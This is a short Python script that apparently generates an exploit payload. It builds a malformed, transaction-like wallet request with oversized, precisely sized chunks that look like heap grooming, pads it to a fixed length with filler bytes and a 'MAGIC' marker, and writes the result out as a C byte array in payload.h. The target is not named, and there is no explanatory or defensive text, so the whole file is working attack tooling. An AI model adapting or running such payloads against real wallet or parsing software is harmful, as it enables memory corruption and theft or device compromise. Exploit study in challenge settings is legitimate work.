import struct
p32 = lambda _: struct.pack('<I', _)
p64 = lambda _: struct.pack('<Q', _)

def pack_varint(l):
    if l < 0xFD:
        return bytes([l])
    elif l < 0x10000:
        return bytes([0xfd]) + struct.pack('>H', l)
    assert 0

def pack_varbytes(s):
    return pack_varint(len(s)) + s

def pack_request(wallet_id, itemA, itemB):
    s = b''
    s += p32(wallet_id)

    s += pack_varint(len(itemA))
    for item in itemA:
        assert len(item[0]) == 0x20
        s += item[0]
        s += p32(item[1])
        s += pack_varbytes(item[2])
        s += p32(item[3])

    s += pack_varint(len(itemB))
    for item in itemB:
        s += p64(item[0])
        s += pack_varbytes(item[1])
    s += p32(0xdddddddd)
    return s

make_chunk = lambda _: (b'J' * 0x20, 0xfff, b'j' * _, 0xeee)

a0 = (b'A' * 0x20, 0x111, b'a' * 0x200, 0x111)
b0 = (0xaaa, b'a' * 0x82)
p1 = pack_request(0, [make_chunk(0x1a20 - 0x400), make_chunk(0x20)], [b0])
p1 += b'\x55' * 0x25ce
p1 += b'MAGIC'
p1 = p1.ljust(0x59f0, b'\x66')
print(p1.hex())

with open('payload.h', 'w') as f:
    f.write('unsigned char payload[] = {%s};\n' % str(list(map(int, p1)))[1:-1])
